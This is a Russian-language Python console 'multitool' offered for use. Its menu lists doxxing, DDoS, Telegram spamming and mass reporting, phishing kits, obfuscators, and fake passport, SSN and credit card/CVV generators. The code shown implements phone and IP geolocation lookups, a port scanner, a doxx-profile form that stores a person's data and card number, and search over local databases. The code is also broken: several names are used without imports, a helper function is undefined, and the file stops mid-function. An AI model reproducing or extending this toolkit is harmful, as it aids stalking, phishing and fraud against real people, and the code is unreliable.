#прочитал- гей
#пуки каки какашки 
import os
import json
import random
import qrcode
import secrets
import string
import uuid
import hashlib
import requests
import whois
import time
import threading
import speedtest
import uuid
import smtplib
import base64
import re
import sys
import zlib
import marshal
import pytesseract
import psutil
import aiohttp
import asyncio
import subprocess
import platform
import zipfile
import rarfile
import zxing
import difflib
import webbrowser
import telebot
import pyzipper
from pathlib import Path
from getpass import getpass
from telebot import types
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from pytube import YouTube
from PIL import Image
from termcolor import colored
from colorama import init, Fore, Style
from telethon import TelegramClient, errors
from intro import display_intro
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from validate_email_address import validate_email
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from faker import Faker
from datetime import datetime
from ipwhois import IPWhois
from pystyle import Colors, Colorate, Center, Box, Write
from banner import print_banner

COLOR_CODE = {
    "RESET": "\033[0m",
    "GREEN": "\033[32m",
    "RED": "\033[31m",
}

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

fake = Faker()

class PhoneNumberInfo:
    clear_console()
    def __init__(self):
        self.htmlweb_api_url = "https://htmlweb.ru/geo/api.php?json&telcod="
        self.cache_file = 'phone_cache.json'
        self._load_cache()

    def _load_cache(self):
        try:
            with open(self.cache_file, 'r') as file:
                self.cache = json.load(file)
        except FileNotFoundError:
            self.cache = {}

    def _save_cache(self):
        with open(self.cache_file, 'w') as file:
            json.dump(self.cache, file)

    def get_number_data(self, user_number):
        if user_number in self.cache:
            return self.cache[user_number]

        response_htmlweb = requests.get(self.htmlweb_api_url + user_number)

        if response_htmlweb.ok:
            data_htmlweb = response_htmlweb.json()

            self.cache[user_number] = data_htmlweb
            self._save_cache()
            return data_htmlweb
        else:
            return {"status_error": True}

    def print_number_info(self):
        clear_console()
        print(Colorate.Horizontal(Colors.green_to_white, "У функции есть лимиты на запросы!"))

        user_number = input(Colorate.Horizontal(Colors.green_to_white, "Введите номер телефона (например, +79833170773): ")).strip()

        if user_number:
            print(Colorate.Horizontal(Colors.green_to_white, "Поиск данных...\n"))
            data = self.get_number_data(user_number)

            if data.get("status_error"):
                print(Colorate.Horizontal(Colors.red_to_white, "Ошибка: Не удалось получить данные. Проверьте номер телефона и попробуйте снова."))
                return

            if data.get("limit") == 0:
                print(Colorate.Horizontal(Colors.red_to_white, "Вы израсходовали все лимиты запросов."))
                return

            country = data.get('country', {})
            region = data.get('region', {})
            other = data.get('0', {})

            print(Colorate.Horizontal(Colors.green_to_white, f"Страна: {country.get('name', 'Не найдено')}, {country.get('fullname', 'Не найдено')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Город: {other.get('name', 'Не найдено')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Почтовый индекс: {other.get('post', 'Не найдено')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Код валюты: {country.get('iso', 'Не найдено')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Телефонные коды: {data.get('capital', {}).get('telcod', 'Не найдено')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Посмотреть в wiki: {other.get('wiki', 'Не найдено')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Гос. номер региона авто: {region.get('autocod', 'Не найдено')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Оператор: {other.get('oper', 'Не найдено')}, {other.get('oper_brand', 'Не найдено')}, {other.get('def', 'Не найдено')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Местоположение: {country.get('name', 'Не найдено')}, {region.get('name', 'Не найдено')}, {other.get('name', 'Не найдено')} ({region.get('okrug', 'Не найдено')})"))

            latitude = other.get('latitude', 'Не найдено')
            longitude = other.get('longitude', 'Не найдено')
            location = data.get('location', 'Не найдено')
            lang = country.get('lang', 'Не найдено').title()
            lang_code = country.get('langcod', 'Не найдено')
            capital = data.get('capital', {}).get('name', 'Не найдено')

            print(Colorate.Horizontal(Colors.green_to_white, f"Открыть на карте (google): https://www.google.com/maps/place/{latitude}+{longitude}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Локация: {location}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Язык общения: {lang}, {lang_code}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Край/Округ/Область: {region.get('name', 'Не найдено')}, {region.get('okrug', 'Не найдено')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Столица: {capital}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Широта/Долгота: {latitude}, {longitude}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Оценка номера в сети: https://phoneradar.ru/phone/{user_number}"))

        else:
            print(Colorate.Horizontal(Colors.red_to_white, "Ошибка: Номер телефона не введен."))
    
def port_scan(ip):
    print(Colorate.Horizontal(Colors.green_to_white, f"Сканирование {ip} на открытые порты (ожидаемое время ~2 минуты)..."))
    start_time = datetime.now()
    open_ports = []

    
    for port in range(1, 1025):
        if scan_port(ip, port):
            open_ports.append(port)

    end_time = datetime.now()
    total_time = end_time - start_time

    print(Colorate.Horizontal(Colors.green_to_white, f"\nСканирование завершено за {total_time}\n"))
    
    if open_ports:
        print(Colorate.Horizontal(Colors.green_to_white, "Открытые порты:"))
        for port in open_ports:
            print(Colorate.Horizontal(Colors.green_to_white, f"Порт {port} открыт"))
    else:
        print(Colorate.Horizontal(Colors.green_to_white, "Открытых портов не найдено"))

    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def change_page(current_page, direction):
    if direction == "next":
        if current_page < 1:  
            return current_page + 1
        else:
            print("Это последняя страница.")
            input("Нажмите Enter для продолжения...")
            return current_page
    elif direction == "prev":
        if current_page > 0:
            return current_page - 1
        else:
            print("Это первая страница.")
            input("Нажмите Enter для продолжения...")
            return current_page

def input_with_menu(message):
    print(message)
    input(Colorate.Horizontal(Colors.green_to_blue, "Нажмите Enter для возврата в меню..."))
    return

def display_menu(page):
    clear_console()
    print_banner()
    functions_per_page = 100 if page == 1 else 78 
    total_functions = 178  

    start_index = page * functions_per_page
    end_index = min(start_index + functions_per_page, total_functions)

    if page == 0:
        function_descriptions = [
            "[001]. Получение информации об IP-адресе",
            "[002]. Поиск информации по домену",
            "[003]. Поиск по номеру телефона",
            "[004]. Поиск в Википедии",
            "[005]. Поиск по базе данных",
            "[006]. Шаблон дл докса",
            "[007]. Текст банворд",
            "[008]. Web-crawler",
            "[009]. Узнать свой IP",
            "[010]. Информация о почте",
            "[011]. Информация о MAC-Адресе",
            "[012]. Интернет speedtest",
            "[013]. Переводчик",
            "[014]. Скрапер Прокси",
            "[015]. Узнать свой HWID",
            "[016]. Валидатор email-адресов",
            "[017]. Проверка доступности сайта",
            "[018]. Сокращатор ссылок",
            "[019]. Поиск по VIN",
            "[020]. Отправка писем с твоей почты",
            "[021]. Порт скан",
            "[022]. Шифрование/Дешифрование base64",
            "[023]. DDOS (1)",
            "[024]. Телеграм Спамер кодов",
            "[025]. Сохранить файл в облако",
            "[026]. Сжатие Изображений",
            "[027]. Парсинг Репозиториев github", 
            "[028]. Парсинг html",
            "[029]. Мониторинг Системы",
            "[030]. Список запущенных процессов",
            "[031]. Репортер ТГ ",
            "[032]. Преобразовать py-exe",
            "[033]. Мониторинг сетевого трафика",
            "[034]. Мониторинг процессора и памяти",
            "[035]. Мониторинг использования диска",
            "[036]. Проверка обновлений установленных пакетов",
            "[037]. Проверка в VirusTotal",
            "[038]. Проверка SSL-сертификатов сайта",
            "[039]. Поиск Whois информации по домену",
            "[040]. Определение местоположения по IP",
            "[041]. Мониторинг активности файлов",
            "[042]. Конвертер файлов PDF в Word",
            "[043]. Поиск и удаление дубликатов файлов",
            "[044]. Извлечение текста из изображений",
            "[045]. Парсинг данных из JSON-файла",
            "[046]. Скачать видео с Ютуб",
            "[047]. Скачать видео с Тикток",
            "[048]. Узнать свои установленные программы",
            "[049]. Узнать свои сетевые подключения",
            "[050]. Узнать свою ОС",
            "[051]. Создать zip архив",
            "[052]. Создать 7z архив",
            "[053]. Создать rar архив",
            "[054]. Извлечение файлов из архива",
            "[055]. Расшифровка QR-кодов",
            "[056]. Сравнение текстовых файлов",
            "[057]. Конвертация видео в аудио",
            "[058]. Конвертация аудио в текст",
            "[059]. Создание GIF из видео",
            "[060]. Фишинг ГБ ",
            "[061]. Фишинг Накрут",
            "[062]. Фишинг Анон.чат",
            "[063]. Кодировать Marshal",
            "[064]. Кодировать Zlib",
            "[065]. Кодировать Base16",
            "[066]. Кодировать Base32",
            "[067]. Кодировать Base64",
            "[068]. Кодировать Zlib,Base16",
            "[069]. Кодировать Zlib,Base32",
            "[070]. Кодировать Zlib,Base64",
            "[071]. Кодировать Marshal,Zlib",
            "[072]. Кодировать Marshal,Base16",
            "[073]. Кодировать Marshal,Base32",
            "[074]. Кодировать Marshal,Base64",
            "[075]. Кодировать Marshal,Zlib,Base16",
            "[076]. Кодировать Marshal,Zlib,Base32",
            "[077]. Кодировать Marshal,Zlib,Base64",
            "[078]. Simple Encode",
            "[079]. Временная почта",
            "[080]. Поставить пароль на файл"        ] 
    elif page == 1:
        function_descriptions = [
    "[101]. Генерация номера телефона (Россия)",
    "[102]. Генерация номера телефона (Казахстан)",
    "[103]. Генерация номера телефона (Украина)",
    "[104]. Генерация номера телефона (Беларусь)",
    "[105]. Генерация номера телефона (Узбекистан)",
    "[106]. Генерация номера телефона (Грузия)",
    "[107]. Генерация паспорта (Россия)",
    "[108]. Генерация паспорта (Казахстан)",
    "[109]. Генерация паспорта (Украина)",
    "[110]. Генерация QR-кода",
    "[111]. Генерация токена Discord",
    "[112]. Генерация ключа Mullvad",
    "[113]. Генерация случайного токена API",
    "[114]. Генерация случайного имени",
    "[115]. Генерация случайного адреса",
    "[116]. Генерация случайного пароля",
    "[117]. Генерация случайного почтового индекса",
    "[118]. Генерация случайного логина",
    "[119]. Генерация случайного идентификатора",
    "[120]. Генерация случайного электронного адреса",
    "[121]. Генерация юзера",
    "[122]. Генерация пароля",
    "[123]. Генерация электронной почты",
    "[124]. Генерация IP Адреса",
    "[125]. Генерация URL",
    "[126]. Генерация MAC-адреса",
    "[127]. Генерация UUID",
    "[128]. Генерация цвета в формате HEX",
    "[129]. Генерация цвета в формате RGB",
    "[130]. Генерация кода штрих-кода",
    "[131]. Генерация токена JWT",
    "[132]. Генерация имени файла.",
    "[133]. Генерация Содержимого файла",
    "[134]. Генерация ZIP-кода (США).",
    "[135]. Генерация телефонного номера (США).",
    "[136]. Генерация адреса (США).",
    "[137]. Генерация VIN для автомобиля.",
    "[138]. Генерация идентификатора банка (BIN).",
    "[139]. Генерация ИНН",
    "[140]. Генерация SSN",
    "[141]. Генерация номера кредитной карты.",
    "[142]. Генерация CVV кода для кредитной карты.",
    "[143]. Генерация IBAN",
    "[144]. Генерация SWIFT",
    "[145]. Генерация Bitcoin адреса",
    "[146]. Генерация Ethereum адреса",
    "[147]. Генерация комментария",
    "[148]. Генерация сообщения",
    "[149]. Генерация логина",
    "[150]. Генерация случайного пароля",
    "[151]. Генерация никнейма",
    "[152]. Генерация строки JSON",
    "[153]. Генерация строки XML",
    "[154]. Генерация случайного числа",
    "[155]. Генерация случайной строки",
    "[156]. Генерация случайных символов",
    "[157]. Генерация списка случайных чисел",
    "[158]. Генерация списка случайных строк",
    "[159]. Генерация случайной даты и времени",
    "[160]. Генерация случайного временного интервала",
    "[161]. Генерация email с доменом",
    "[162]. Генерация пароля с параметрами",
    "[163]. Генерация строки заданной длины",
    "[164]. Генерация кода активации",
    "[165]. Генерация токена аутентификации",
    "[166]. Генерация сообщения в чате",
    "[167]. Генерация имени пользователя",
    "[168]. Генерация имени персонажа",
    "[169]. Генерация псевдонима",
    "[170]. Генерация никнейма",
    "[171]. Генерация номера счета",
    "[172]. Генерация BIC",
    "[173]. Генерация IMEI",
    "[174]. Генерация серийного номера",
    "[175]. Генерация лицензионного ключа",
    "[176]. Генерация купона",
    "[177]. Генерация приглашения в игру",
    "[178]. Генерация пароля для Wi-Fi",
    "[179]. Генерация ключа шифрования",
    "[180]. Генерация сессионного ID",
    "[181]. Генерация идентификатора пользователя",
    "[182]. Генерация кода подтверждения",
    "[183]. Генерация номера факса",
    "[184]. Генерация одноразового email",
    "[185]. Генерация почтового адреса",
    "[186]. Генерация ID для базы данных",
    "[187]. Генерация комментария",
    "[188]. Генерация отзыва",
    "[189]. Генерация ответа на опрос",
    "[190]. Генерация TIN",
    "[191]. Генерация ISIN",
    "[192]. Генерация ключа API",
    "[193]. Генерация секретного ключа",
    "[194]. Генерация публичного ключа",
    "[195]. Генерация приватного ключа",
    "[196]. Генерация PGP-ключа",
    "[197]. Генерация адреса криптовалюты",
    "[198]. Генерация кода приглашения",
    "[199]. Генерация ID транзакции",
    "[200]. Генерация ID чата",
        ]
    else:
        function_descriptions = []

    if function_descriptions:
        col_width = max(len(function) for function in function_descriptions) + 2
        cols = 4
        rows = (len(function_descriptions) + cols - 1) // cols

        top_border = "╭" + "─" * (col_width * cols + cols - 1) + "╮"
        bottom_border = "╰" + "─" * (col_width * cols + cols - 1) + "╯"

        menu_content = top_border + "\n"
        for row in range(rows):
            row_items = []
            for col in range(cols):
                index = row + col * rows
                if index < len(function_descriptions):
                    row_items.append(function_descriptions[index].ljust(col_width))
                else:
                    row_items.append("".ljust(col_width))
            menu_content += "│" + "│".join(row_items) + "│\n"
        menu_content += bottom_border + "\n"

        footer_width = col_width * cols + (cols - 1)
        footer_top_border = "╭" + "─" * footer_width + "╮"
        footer_bottom_border = "╰" + "─" * footer_width + "╯"
        developer_text = "DEVELOPER : @Susanoooooooo"
        donate_text = "Donate ^^ - https://t.me/send?start=IV8sqnZMFJ6A | Или введите 999"
        channel_text = "Channel : https://t.me/+5N4FXvQT9C8wYjNi"

        left_width = len(developer_text) + 1
        right_width = len(channel_text) + 1
        remaining_width = footer_width - left_width - right_width - 3

        if remaining_width > len(donate_text):
            center_text = donate_text.center(remaining_width)
        else:
            center_text = donate_text[:remaining_width - 3] + "..."

        footer_content = (
            f"│ {developer_text} {center_text} {channel_text}  │\n"
        )

        menu_content += footer_top_border + "\n" + footer_content + footer_bottom_border

        print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(menu_content)))
        print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter("\nnext. Следующая страница\nprev. Предыдущая страница\nЧтобы выйти, exit, или же CTRL + C ")))
    else:
        print("Нет доступных функций для отображения.")
       
def search_ip(ip):
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        if data['status'] == 'success':
            return data
        else:
            return "Информация по IP не найдена."
    else:
        return "Не удалось подключиться к API."

def search_domain(domain):
    try:
        domain_info = whois.whois(domain)
        return domain_info
    except Exception as e:
        return f"Ошибка при получении информации о домене: {e}"

def search_number():
    phone_info = PhoneNumberInfo()
    phone_info.print_number_info()

def search_wikipedia(query):
    ua = UserAgent()
    user_agent = ua.random

    wiki_wiki = wikipediaapi.Wikipedia(
        language='ru',  
        extract_format=wikipediaapi.ExtractFormat.WIKI,
        user_agent=user_agent
    )
    page = wiki_wiki.page(query)

    if page.exists():
        return page.summary
    else:
        return "Статья не найдена."

def search_database():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear') 
        print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Чтобы добавить базу данных, добавьте базу данных в папку database в директории Valkyrie")))
        search_term = input(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Введите данные для поиска (или 'exit' для выхода): ")))

        if search_term.lower() == 'exit':
            break

        os.system('cls' if os.name == 'nt' else 'clear')
        print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Поиск...")))

        directory = 'database'
        results_found = False
        start_time = time.time()

        if not os.path.exists(directory):
            print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Папка 'database' не найдена. Проверьте наличие папки в директории Valkyrie.")))
            input(Colorate.Horizontal(Colors.green_to_white, "Нажмите Enter, чтобы продолжить..."))
            continue

        for file_name in os.listdir(directory):
            file_path = os.path.join(directory, file_name)

            try:
                df = None
                if file_path.endswith('.csv'):
                    for chunk in pd.read_csv(file_path, chunksize=10000, dtype=str, engine='python'):
                        matches = chunk[chunk.apply(lambda row: row.astype(str).str.contains(search_term, case=False, na=False).any(), axis=1)]
                        if not matches.empty:
                            results_found = True
                            print(Colorate.Horizontal(Colors.green_to_white, matches.to_string(index=False)))
                elif file_path.endswith('.xlsx') or file_path.endswith('.xls'):
                    for chunk in pd.read_excel(file_path, chunksize=10000, dtype=str):
                        matches = chunk[chunk.apply(lambda row: row.astype(str).str.contains(search_term, case=False, na=False).any(), axis=1)]
                        if not matches.empty:
                            results_found = True
                            print(Colorate.Horizontal(Colors.green_to_white, matches.to_string(index=False)))
                elif file_path.endswith('.json'):
                    df = pd.read_json(file_path, dtype=str)
                    matches = df[df.apply(lambda row: row.astype(str).str.contains(search_term, case=False, na=False).any(), axis=1)]
                    if not matches.empty:
                        results_found = True
                        print(Colorate.Horizontal(Colors.green_to_white, matches.to_string(index=False)))
                elif file_path.endswith('.html'):
                    df = pd.read_html(file_path, dtype=str)[0]
                    matches = df[df.apply(lambda row: row.astype(str).str.contains(search_term, case=False, na=False).any(), axis=1)]
                    if not matches.empty:
                        results_found = True
                        print(Colorate.Horizontal(Colors.green_to_white, matches.to_string(index=False)))
                elif file_path.endswith('.xml'):
                    df = pd.read_xml(file_path, dtype=str)
                    matches = df[df.apply(lambda row: row.astype(str).str.contains(search_term, case=False, na=False).any(), axis=1)]
                    if not matches.empty:
                        results_found = True
                        print(Colorate.Horizontal(Colors.green_to_white, matches.to_string(index=False)))
                elif file_path.endswith('.txt'):
                    with open(file_path, 'r', encoding='utf-8') as file:
                        lines = file.readlines()
                    matches = [line.strip() for line in lines if search_term.lower() in line.lower()]
                    if matches:
                        results_found = True
                        print(Colorate.Horizontal(Colors.green_to_white, "\n".join(matches)))
            except Exception as e:
                print(Colorate.Horizontal(Colors.green_to_white, f"Ошибка при обработке файла {file_name}: {e}"))

        end_time = time.time()

        if not results_found:
            print(Colorate.Horizontal(Colors.green_to_white, "Результаты не найдены или данные отсутствуют в базе."))
        
        print(Colorate.Horizontal(Colors.green_to_white, f"Поиск завершен за {end_time - start_time:.2f} секунд."))
        input(Colorate.Horizontal(Colors.green_to_white, "Нажмите Enter, чтобы продолжить..."))


def process_personal_data():
    clear_console()
    name = input("Введите ваше имя: ")
    age = input("Введите ваш возраст: ")
    dob = input("Введите дату рождения (в формате ДД-ММ-ГГГГ): ")
    address = input("Введите ваш адрес: ")
    phone = input("Введите ваш номер телефона: ")
    email = input("Введите ваш email: ")
    card_number = input("Введите номер вашей карты: ")
    social_media = input("Введите ваши социальные сети: ")
    additional_info = input("Введите дополнительную информацию: ")

  
    template = f"""
------------------------------
Name: {name}
Age: {age}
Date of Birth: {dob}
Address: {address}
Phone: {phone}
Email: {email}
Card Number: {card_number}
Social Media: {social_media}
Additional Info: {additional_info}
------------------------------
"""

   
    gradient_text = Colorate.Vertical(Colors.green_to_white, template)

    current_directory = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_directory, 'personal_data.txt')


    with open(file_path, 'w') as file:
        file.write(template)
    

    return gradient_text

def text_banword():
    clear_console()
    replacement_map = {
        'а': '@', 'б': '6', 'в': 'B', 'г': 'r', 'д': 'D',
        'е': 'e', 'ё': 'e', 'ж': 'J', 'з': '3', 'и': 'u',
        'й': 'u', 'к': 'K', 'л': 'JI', 'м': 'M', 'н': 'H',
        'о': 'o', 'п': 'n', 'р': 'p', 'с': 'c', 'т': 'T',
        'у': 'y', 'ф': 'f', 'х': 'x', 'ц': 'C', 'ч': '4',
        'ш': 'W', 'щ': 'W', 'ь': 'b', 'ы': 'bi', 'ъ': 'b',
        'э': '3', 'ю': 'io', 'я': '9'
    }

    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, "Введите текст для замены:"))
    text = input()
    
    randomized_text = ''.join(
        random.choice([char, replacement_map.get(char.lower(), char)])
        if char.lower() in replacement_map else char
        for char in text
    )
    
    print(Colorate.Horizontal(Colors.green_to_white, f"\nИзменённый текст:\n{randomized_text}"))

def web_crawler():
    clear_console()
    
    url = input(Colorate.Horizontal(Colors.green_to_white, "Введите URL для сканирования: "))
    keyword = input(Colorate.Horizontal(Colors.green_to_white, "Введите ключевое слово для поиска: "))
    
    try:
        
        response = requests.get(url)
        response.raise_for_status()  
        
   
        soup = BeautifulSoup(response.text, 'html.parser')
        text = soup.get_text()
        
       
        if keyword.lower() in text.lower():
            print(Colorate.Horizontal(Colors.green_to_white, f"Ключевое слово '{keyword}' найдено на странице!"))
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f"Ключевое слово '{keyword}' не найдено на странице."))
    except requests.exceptions.RequestException as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Произошла ошибка при доступе к URL: {e}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Произошла ошибка: {e}"))
    
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def check_my_ip():
    clear_console()
    response = requests.get("https://api64.ipify.org?format=json")
    if response.ok:
        ip = response.json()["ip"]
        print("Ваш IP-адрес: " + Colorate.Horizontal(Colors.green_to_white, ip))
    else:
        print("Ошибка при определении IP-адреса")

    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))


def email_info(email):
    clear_console()
    if '@' not in email:
        print(Colorate.Horizontal(Colors.red_to_white, "Некорректный email адрес."))
        return

    url = f'https://emailrep.io/{email}'
    response = requests.get(url)

    if response.status_code == 200:
        info = response.json()
        if isinstance(info, dict):
            reputation = info.get('reputation', 'unknown')
            reputation_mapping = {'min': 'минимальная', 'medium': 'средняя', 'high': 'высокая'}
            reputation = reputation_mapping.get(reputation, 'неизвестная')

            print(Colorate.Horizontal(Colors.green_to_white, f"Репутация: {reputation}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Подозрительно: {'Да' if info.get('suspicious') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Ссылки: {info.get('references', 0)}"))

            details = info.get('details', {})
            print(Colorate.Horizontal(Colors.green_to_white, f"Черный список: {'Да' if details.get('blacklisted') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Злонамеренная активность: {'Да' if details.get('malicious_activity') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Недавняя злонамеренная активность: {'Да' if details.get('malicious_activity_recent') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Утечка учетных данных: {'Да' if details.get('credentials_leaked') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Недавняя утечка учетных данных: {'Да' if details.get('credentials_leaked_recent') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Утечка данных: {'Да' if details.get('data_breach') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Впервые увиден: {details.get('first_seen', 'неизвестно') }"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Последний раз увиден: {details.get('last_seen', 'неизвестно') }"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Существует домен: {'Да' if details.get('domain_exists') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Репутация домена: {details.get('domain_reputation', 'неизвестно')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Новый домен: {'Да' if details.get('new_domain') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Дней с момента создания домена: {details.get('days_since_domain_creation', 'неизвестно')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Подозрительное доменное расширение: {'Да' if details.get('suspicious_tld') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Спам: {'Да' if details.get('spam') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Бесплатный провайдер: {'Да' if details.get('free_provider') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Одноразовый адрес: {'Да' if details.get('disposable') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Доставимо: {'Да' if details.get('deliverable') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Принимает все: {'Да' if details.get('accept_all') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Действительный MX: {'Да' if details.get('valid_mx') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Основной MX: {details.get('primary_mx', 'неизвестно')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Можно подделать: {'Да' if details.get('spoofable') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Строгая SPF: {'Да' if details.get('spf_strict') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"DMARC наложен: {'Да' if details.get('dmarc_enforced') else 'Нет'}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Профили: {', '.join(details.get('profiles', [])) if details.get('profiles') else 'нету'}"))
        else:
            print(Colorate.Horizontal(Colors.green_to_white, "Не удалось получить информацию о почте."))
    elif response.status_code == 429:
        print(Colorate.Horizontal(Colors.red_to_white, "Лимит запросов превышен. Подождите некоторое время и попробуйте снова."))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка: {response.status_code}"))

def get_mac_info():
    mac_address = input(Colorate.Horizontal(Colors.green_to_white, "Введите MAC-адрес: "))
    response = requests.get(f"https://api.macvendors.com/{mac_address}")
    if response.status_code == 200:
        print(Colorate.Horizontal(Colors.green_to_white, f"Информация о MAC-адресе: {response.text}"))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, "Не удалось получить информацию о MAC-адресе."))
    
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))
    return

def check_internet_speed():
    try:
        st = speedtest.Speedtest()
        st.download()
        st.upload()
        download_speed = st.results.download / 1_000_000  
        upload_speed = st.results.upload / 1_000_000  
        print(f"Скорость загрузки: {download_speed:.2f} Мбит/с")
        print(f"Скорость выгрузки: {upload_speed:.2f} Мбит/с")
    except Exception as e:
        print(f"Произошла ошибка: {e}")

check_internet_speed()

def translate_text():
    clear_console()
    
    text = input(Colorate.Horizontal(Colors.green_to_white, "Введите текст для перевода: "))
    dest_lang = input(Colorate.Horizontal(Colors.green_to_white, "Введите язык для перевода (например, 'en' для английского): "))
    
    try:
        translator = GoogleTranslator(target=dest_lang)
        translation = translator.translate(text)
        print(Colorate.Horizontal(Colors.green_to_white, f"Перевод: {translation}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Произошла ошибка: {e}"))
    
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def scrape_proxies():
    clear_console()
    
    url = 'https://www.sslproxies.org/'
    try:
        response = requests.get(url)
        response.raise_for_status()  
    except requests.RequestException as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при запросе к {url}: {e}"))
        return
    
    soup = BeautifulSoup(response.content, 'html.parser')
    proxy_table = soup.find(id='proxylisttable')
    
    if proxy_table is None:
        print(Colorate.Horizontal(Colors.red_to_white, "Не удалось найти таблицу прокси на странице."))
        return
    
    tbody = proxy_table.find('tbody')
    if tbody is None:
        print(Colorate.Horizontal(Colors.red_to_white, "Не удалось найти тело таблицы прокси на странице."))
        return
    
    proxies = []
    for row in tbody.find_all('tr'):
        cols = row.find_all('td')
        if len(cols) >= 2:
            proxy_ip = cols[0].get_text(strip=True)
            proxy_port = cols[1].get_text(strip=True)
            proxies.append(f"{proxy_ip}:{proxy_port}")
    
    if proxies:
        print(Colorate.Horizontal(Colors.green_to_white, "Список прокси:"))
        for proxy in proxies:
            print(Colorate.Horizontal(Colors.green_to_white, proxy))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, "Прокси не найдены."))
    
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def get_hwid():
    clear_console()
    
    hwid = uuid.getnode()
    print(Colorate.Horizontal(Colors.green_to_white, f"Ваш HWID: {hwid}"))
    
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def validate_email_address():
    clear_console()
    
    email = input(Colorate.Horizontal(Colors.green_to_white, "Введите email-адрес: "))
    
    is_valid = validate_email(email)
    if is_valid:
        print(Colorate.Horizontal(Colors.green_to_white, "Email-адрес действителен"))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, "Email-адрес недействителен"))
    
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def check_website_status():
    clear_console()
    
    url = input(Colorate.Horizontal(Colors.green_to_white, "Введите URL для проверки доступности: "))
    
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(Colorate.Horizontal(Colors.green_to_white, "Сайт доступен"))
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f"Сайт недоступен. Код ответа: {response.status_code}"))
    except requests.RequestException as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при проверке доступности сайта: {e}"))
    
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def shorten_url():
    
    os.system('cls' if os.name == 'nt' else 'clear')

    long_url = input(Colorate.Horizontal(Colors.green_to_white, "Введите URL для сокращения: "))
    
   
    response = requests.get(f'http://tinyurl.com/api-create.php?url={long_url}')
    
 
    if response.status_code == 200:
        short_url = response.text
